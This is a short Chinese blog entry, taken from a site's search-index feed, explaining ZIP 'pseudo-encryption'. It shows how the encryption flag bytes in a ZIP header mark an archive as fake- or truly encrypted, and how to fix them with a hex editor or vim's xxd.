        <content type="html"><![CDATA[<p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。 </p><p>50 4b 03 04 头文件标记<br>14 00解压文件所需 pkware 版本<br>00 00全局方式位标记（有无加密） </p><p>50 4b 01 02目录中文件头标记<br>3F 00压缩使用的 pkware 版本<br>14 00解压文件所需 pkware 版本<br>00 00全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）  </p><p><img src="https://i.loli.net/2019/11/08/jxlJ86snOMXADcp.png" alt="image-20191108124206161.png"></p><p>这里有多种方式解决伪加密</p><p>windows中可以通过下载winhex来进行16进制编辑</p><p>linux可以使用vim</p><p>在vim中使用**:%!xxd**打开16进制</p><p>使用**:%!xxd -r**恢复</p><h1 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h1><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code></p><h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><p>参考 ：<a href="https://blog.csdn.net/u011377996/article/details/79286958">https://blog.csdn.net/u011377996/article/details/79286958</a> </p>]]></content>
      
      
      <categories>
          
          <category> 2019年11月 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
